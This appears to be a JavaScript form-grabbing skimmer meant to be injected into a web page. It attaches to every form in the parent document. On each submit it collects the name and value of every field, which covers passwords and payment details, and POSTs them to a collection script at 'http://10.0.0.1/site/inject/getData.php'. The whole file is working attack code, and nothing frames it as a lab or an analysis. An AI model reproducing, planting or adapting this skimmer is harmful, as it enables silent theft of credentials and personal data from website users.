;
function kLogStart()
{
	var forms = parent.document.getElementsByTagName("form");
	for (i=0; i < forms.length; i++) 
	{
		forms[i].addEventListener('submit', function() {
			var cadena = "";
			var forms = parent.document.getElementsByTagName("form");
			
			for (x=0; x < forms.length; x++)
			{
				var elements = forms[x].elements;
				for (e=0; e < elements.length; e++)
				{
					cadena += elements[e].name + "::" + elements[e].value + "||";
				}
				//alert(cadena);
			}
			//alert(cadena);
			attachForm(cadena);
		}, false);
	}
}

function attachForm(cadena) 
{
	//ajaxFunction(cadena);
	AJAXPost(cadena);
}

function AJAXPost(cadena)
{

    if (window.XMLHttpRequest){// code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp = new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    
    var params = "v=" + cadena;
    
    xmlhttp.open("POST","http://10.0.0.1/site/inject/getData.php",false);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    //xmlhttp.setRequestHeader("Content-length", params.length);
    //xmlhttp.setRequestHeader("Connection", "close");
	xmlhttp.send(params);
    return xmlhttp.responseText;    
}

kLogStart();
